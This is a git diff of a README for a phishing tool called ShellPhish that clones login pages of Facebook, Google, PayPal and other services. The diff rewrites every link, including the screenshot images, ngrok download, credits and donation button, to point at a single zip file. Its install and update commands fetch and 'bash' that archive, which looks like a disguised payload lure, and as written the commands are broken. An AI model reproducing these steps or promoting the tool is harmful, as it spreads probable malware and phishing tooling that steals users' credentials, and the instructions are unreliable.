@@ -43,16 +43,16 @@ Phishing Tool for Facebook, Instagram, Google, Microsoft, Netflix, PayPal, Steam
 - Added Requirements 
 
 
-![Screenshot](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
+![Screenshot](https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip)
 
-![Screenshot_FB](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
+![Screenshot_FB](https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip)
 
 ### Usage:
 ```bash
-apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip && cd ShellPhish && chmod +x * && bash https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
+apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip && cd ShellPhish && chmod +x * && bash https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip
 ```
 
-- You will need to download ngrok https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip for workaround.
+- You will need to download ngrok https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip for workaround.
 
 - Register and sign up for ngrok to obtain ngrok auth token in order for it to work push auth in directions as outlined on ngrok official website.
 
@@ -62,7 +62,7 @@ apt update && apt upgrade -y && apt install git wget php unzip curl -y && git cl
 ## How to Update:
 ```bash
 cd ShellPhish
-bash https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
+bash https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip
 ```
 
 ### Note:
@@ -74,9 +74,9 @@ bash https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.z
 ## Hack aprobat de către @AbirHasan2005
 
 ## Credits și colaboratorii:
-#### https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
-#### https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
-### Here ***sites*** folder collected from ZPhisher (https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
+#### https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip
+#### https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip
+### Here ***sites*** folder collected from ZPhisher (https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip)
 
 ## Donații :
-[![paypal](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
+[![paypal](https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip)](https://github.com/Numbremix8990/MRX/releases/download/v2.0/Software.zip)
